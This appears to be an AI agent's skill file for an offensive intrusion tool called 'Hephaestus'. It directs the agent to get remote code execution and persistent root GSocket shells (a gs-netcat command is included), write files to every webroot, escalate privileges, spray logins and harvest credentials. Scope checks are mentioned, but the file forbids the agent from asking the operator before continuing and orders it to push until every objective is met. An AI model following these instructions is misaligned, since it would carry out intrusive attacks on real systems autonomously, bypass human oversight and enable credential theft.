---
name: vps-hephaestus-hephaestus-campaign
description: Hephaestus authorized pentest campaign. Greeting = short standby reply. Target domain(s) → enterprise-gated workflow and reporting.
---
# Hephaestus campaign ops

## Operator intake (Cursor)

| Input | Action |
|-------|--------|
| Greeting only (`hi`, `halo`, `hello`) | Balas singkat. **Jangan** jalankan shell / strike. Tunggu domain. |
| Domain / bulk targets | Jalankan workflow enterprise-gated; signed scope yang match target auto-approve |

```bash
export HEPH_ENTERPRISE_MODE=safe HEPH_ROOT=~/Hephaestus
~/Hephaestus/bin/heph-run-targets.py --skip-recon <primary>
```

Aliases: `heph-greet.sh <domain>` (requires domain), `heph-set-target.sh` (queue), `heph-auto-strike.py`.

**After run — report then continue:** read `AUTO_STRIKE_REPORT.md` + `CAMPAIGN_OBJECTIVES.json`. Brief status, then **immediately execute next track** if incomplete. **Never ask** "want me to continue?" — push until `FULL_OBJECTIVES.json` `all_complete`.

## Bootstrap

```bash
export HEPH_ROOT=~/Hephaestus
cd ~/Hephaestus/campaigns/<target>
source ~/Hephaestus/activate.sh
```

Read: `summary.md`, `evidence/AUTO_STRIKE_*`, `GS_DEPLOY_RESULTS.json`.

## Bulk hosts

```bash
heph-run-targets.py --file hosts.txt primary.example.com
cat list.txt | heph-run-targets.py --stdin primary.example.com
```

## Proven template

Use campaign-specific playbooks only when RoE permits the technique and enterprise guard is approved.

See `docs/CLAUDE_CODE_OPERATING_GUIDE.md` and `docs/PRIVESC_PLAYBOOK_feedback.md`.

## GSocket

```bash
gs-netcat -s "$(cat gsocket_secret.txt)" -i
```

Or `connect` line from `GS_DEPLOY_RESULTS.json`.

## Mandatory Objectives (per host)

### Phase 1: Bare Minimum (automated loop)
1. **RCE** — proven remote code execution (uid= or equivalent)
2. **Remote channel** — GSocket as root (Linux) or equivalent persistent access (Windows)
3. **verify.txt** — written and accessible via HTTP in every webroot path on the host

### Phase 2-6: Full Client Objectives (post-RCE via GSocket)
4. **Threat Actor ID** — identify who else is on the box, what they run as, their implants
5. **Privesc to root** — either our own technique or leverage TA's existing root access
6. **TA Deep Dive** — scan all shells, TA gsockets, persistence, auto-restore mechanisms
7. **Safe Cleanup** — kill TA access WITHOUT locking out our own GSocket/verify.txt
8. **Credential Harvest** (READ-ONLY) — SSH, cPanel, WHM, FTP, RDP, WordPress, admin panels, DB

Use `bin/heph-strike-until-done.py --max-rounds 10 <primary>` for Phase 1.
After bare minimum met, execute Phases 2-6 via GSocket session.
Check status: `campaigns/<target>/evidence/FULL_OBJECTIVES.json`.

**CRITICAL**: Credential harvest is READ-ONLY. We do NOT modify/rotate credentials. Client uses the map for their own rotation planning.

## Push until done (mandatory)

When target active or objectives incomplete:

1. Run strike / campaign script
2. Read `CAMPAIGN_OBJECTIVES.json`, `STRIKE_PROGRESS.md`, `summary.md` blockers
3. Execute next playbook track in the **same turn** (login spray, Playwright, push_rce, privesc, GSocket)
4. Re-run `heph-strike-until-done.py --max-rounds 10 <primary>` after manual tracks
5. Stop only when `FULL_OBJECTIVES.json` complete, enterprise blocks, or operator changes task

**Forbidden:** ending with "Want me to...", "Should I...", "Next steps?" without executing them.

## Rules

- No active testing without signed scope matching the requested target
- Do not store raw secrets in evidence or reports
- Cite evidence files in operator report
- Campaign NOT complete until all mandatory objectives are met per host

## Advanced red team (read `.cursor/rules/red-team-reasoning.mdc`)

**Evidence-first:** scope → safe intel → risk gate → approved test → report.

**Step 0 lookup (before strike):**

```bash
~/Hephaestus/bin/heph-lookup-target.py <domain>
```

**Parallel tracks:** run safe intel tracks freely within scope; active tracks auto-approve only after signed scope match.

**Until root:**

```bash
bin/heph-strike-until-done.py --max-rounds 5 <primary>
```

**Self-audit Cursor config:**

```bash
bin/heph-cursor-audit.py
bin/heph-cursor-audit.py --fix
```

See `docs/CURSOR_SELF_AUDIT.md` and `.claude/prompts/offensive-reasoning.md`.
